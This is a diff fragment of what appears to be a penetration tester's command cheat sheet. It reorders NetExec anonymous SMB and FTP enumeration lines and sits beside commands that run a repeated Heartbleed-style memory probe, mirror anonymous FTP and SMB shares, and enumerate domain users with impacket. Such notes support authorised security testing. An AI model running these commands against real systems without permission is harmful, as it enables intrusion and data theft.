@@ -169,15 +169,14 @@ portnock $TARGET 3456 8234 62431 -v
 while true; do ssltest.py $TARGET |grep -v '00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00' || true; sleep 2; done
 
 ## Infrastructure
-bannerme
+nxc smb hosts -u 'anonymous' -p '' --shares
+nxc ftp hosts -u 'anonymous' -p '' --ls
+creds search ftp
 nmap $TARGET --script "ssl* and not brute" -p 443
 nmap $TARGET --script "ldap* and not brute" -p 389 | grep -Ei 'dnsHostName' | cut -d ':' -f2 | xargs
 KDOM=$(bash -c 'echo "${0^^}"' $DOM);KDC=$(bash -c 'echo "${0^^}"' $DC); echo -e "[libdefaults]\n default_realm = $KDOM\n dns_lookup_kdc = false\n dns_lookup_realm = false\n forwardable = true\n\n[realms]\n $KDOM = {\n  kdc = $KDC\n  admin_server = $KDC\n }\n\n[domain_realm]\n .$DOM = $KDOM\n $DOM = $KDOM" | sudo tee /etc/krb5.conf
 echo "$TARGET $DC $DOM" | sudo tee -a /etc/hosts # Windows: C:\Windows\System32\drivers\etc\hosts
-creds search ftp
-nxc ftp "$TARGET" -u 'anonymous' -p '' --ls
 wget ftp://$TARGET --ftp-user='anonymous' --ftp-password='' -np -nH -m -q -P ftp
-nxc smb "$TARGET" -u 'anonymous' -p '' --shares
 smbme $TARGET
 mkdir smb; smbclient //$TARGET/SHARENAME -N -D . -c 'lcd smb; recurse; prompt; mget *'
 impacket-lookupsid 'anonymous'@$TARGET 10000 -no-pass | cut -d '\' -f 2 | grep 'SidTypeUser' | cut -d ' ' -f 1 | tr '[:upper:]' '[:lower:]'
